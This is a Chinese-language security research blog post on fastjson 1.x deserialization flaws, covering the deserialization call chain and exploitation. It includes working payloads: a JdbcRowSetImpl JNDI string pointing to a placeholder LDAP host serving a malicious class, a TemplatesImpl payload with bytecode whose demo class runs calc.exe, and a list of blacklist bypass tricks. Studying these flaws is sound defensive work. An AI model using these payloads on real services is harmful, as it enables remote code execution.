---
title: fastjson1x学习研究
date: 2023-12-07 17:15:00
tags: Java, Unserialization
---

# 环境搭建

好久没写java了，也没写这安全方面的研究blog了，趁这段空闲期休息并思考了一下未来方向，觉得自己的竞争力与兴趣依旧在这个方向，所以继续“深造”吧——安全的本质是攻防对抗，而安全研究是攻防的明珠，是最一线武器的来源，所以接下来把这件事做好吧。

## Gradle的使用

一点小的知识补充，首先我们把有漏洞的fastjson版本通过gradle/maven引入进来，这里看到配置文件里引入依赖还写得`compile`，但[中央仓库](https://mvnrepository.com/)里推荐使用`implementation`，所以二者有啥区别呢？

```java
dependencies {
    compile group: 'org.apache.logging.log4j', name: 'log4j-core', version: '2.0.2'
    // compile与implementation的区别：前者会传递依赖，后者不传递。故前者使模块间耦合增加。
    implementation group: 'com.alibaba', name: 'fastjson', version: '1.2.20'
    testCompile group: 'junit', name: 'junit', version: '4.12'
}
```

# 分析步骤

## Fastjson的用法

顾名思义，它的主要用途是将对象转换成JSON字符串，这个过程中涉及到了序列化与反序列化，正常我们用它的方法如下:

```java
import com.alibaba.fastjson.*;

class ABC {
    public String artist = "john mayer";
    public ABC(){
    }
    public void setArtist(String cmd){
        System.out.println("this is setting procedure!");
        this.artist = cmd;
    }
    @Override
    public String toString() {
        return "ABC{artist='" + artist + '\'' +'}';
    }
}

public class Evillogger {
    public static void main(String[] args) throws Exception{
        ABC test = new ABC();
        //1. toJSONString这个静态方法来将对象序列化成json格式的字符串
        System.out.println(JSON.toJSONString(test));
        String input = "{\"artist\":\"Phili Collins\"}";
        //2. parseObject将json格式字符串反转换成对象，第二个参数可以指定参考类
        ABC test2 = JSON.parseObject(input, ABC.class);
        System.out.println(test2);
        //3. @type指定发序列化类的模式，也是主要的利用点
        String extra = "{\"@type\":\"com.sechome.llf.ABC\",\"artist\":\"aligaduo\"}";
        JSONObject tt = JSON.parseObject(extra);
        System.out.println(tt);
    }    
}

//输出结果：
//{"artist":"john mayer"}
//this is setting procedure!
//ABC{artist='Phili Collins'}
//this is setting procedure!
//{"artist":"aligaduo"}

```

注意到第三种用法里我们可以通过控制json串里的`@type`字段来实现指定类的发序列化。

## 反序列化流程

核心调用链路：

```java
JSON.parseObject()->
    DefaultJSONParser.parse()-> //部分逻辑：lexer是个指针，从json串的头部开始解析，分析出key:@type和它的value来，并采取loadClass动作，并开始反序列化。
    	ObjectDeserializer.deserialize()-> 
    	... ->
            JavaBeanDeserializer.deserialize()-> // 遍历该对象的属性
                    DefaultFieldDeserializer.parseField()->
                        FieldDeserializer.setValue()->
							method=fieldInfo.method;			// 这里找到了属性的set方法，并调用它。
    						method.invoke()
```

在最后一步，调用到了我们欲反序列化类的属性set方法。实际上，fastjson在反序列化的过程中，会在构造完对象的类之后，分别调用该对象属性的set、get方法，类似于原生反序列化时势必调用readObject方法，所以只要目标环境里的某个类的属性读写方法里有可利用的点，那这个类就是很合适的利用类。

## 利用方式一：JDK原生类JdbcRowSetImpl

有这样一个类`com.sun.rowset.JdbcRowSetImpl`，看名称就知道和数据库连接功能相关，不过这不重要。它的`autoCommit`字段的set方法会发起网络连接。

![image-20231210161236440](https://llf-oss.oss-cn-beijing.aliyuncs.com/bucket/pictures/20231210161243.png)

![image-20231210162249608](https://llf-oss.oss-cn-beijing.aliyuncs.com/bucket/pictures/20231210162252.png)

通过简单分析得知，让这个类的`dataSourceName`字段不为空，并让它触发`setAutoCommit`方法，我们就能在目标环境里发起网络请求。因此我们的payload可以是这样：

```java
"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://host:port/evil.class\",\"AutoCommit\":\"false\"}"
```

我们将在可控的机器人放置恶意class文件等目标去读取并加载， 比如ysoserial系列的payload类。那么，如果对方的环境里做了网络请求限制，又该如何利用呢？我们往下看。

## 利用方式二：JDK原生包xalan的TemplatesImple类

实际测试时发现jdk1.8.0_271里已经对`com.sun.org.apache.bcel.internal.util.ClassLoader`做了移除，但还有一个类可利用`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，它也在ysoserial工具里构建payload时出现过。这里出问题的属性方法是：

![image-20231210175326628](https://llf-oss.oss-cn-beijing.aliyuncs.com/bucket/pictures/20231210175729.png)

![image-20231210175758641](https://llf-oss.oss-cn-beijing.aliyuncs.com/bucket/pictures/20231210175801.png)

![image-20231210180117022](https://llf-oss.oss-cn-beijing.aliyuncs.com/bucket/pictures/20231210180118.png)

所以我们构造`Templatesimpl`类的`_outputproperties`属性，并且给它的`_bytecodes`中填入base64编码过的恶意类字节码，它会在反序列化的过程中被解析，并通过构造函数实例化，此时恶意代码就会执行。payload的最终形式如下：

```java
{	// 字段顺序也会影响到反序列化逻辑，错误的话会导致抛异常。
    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes":["xxxxxxxxxxxx"],	// 恶意字节码，必须继承AbstractTranslet，恶意代码写入构造函数，最后字节码要做base64编码。
    "_name":"anything",				// 保证反序列化流程正常
    "_tfactory":{},					// 同上，保证逻辑不抛异常
    "_outputproperties":{}			// 为了利用它的get方法实例化bytecodes
}

// 服务端反序列化代码如下：
	JSONObject tt = JSON.parseObject(evil, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
```



但值得一提的是，以上属性都是private的，这就要求parseObject方法里指定SupportNonPubilcField参数（1.2.22引入）才行，这在很大程度上限制了payload的通用性。

```JAVA
// payload生成代码
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
public class Evil extends AbstractTranslet{
    public Evil() throws Exception{
        Runtime.getRuntime().exec("calc.exe");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }  
}



```



# 修补与绕过

## 1.2.25修复



早期的绕过主要因checkAutoType的逻辑引入：

1. 利用缓存类和逻辑缺陷绕过；
2. 利用`LXXXX;`绕过黑名单检查；
3. 利用双写`LLXXXX;;`绕过黑名单检查；
4. 利用`[{`绕过黑名单检查。

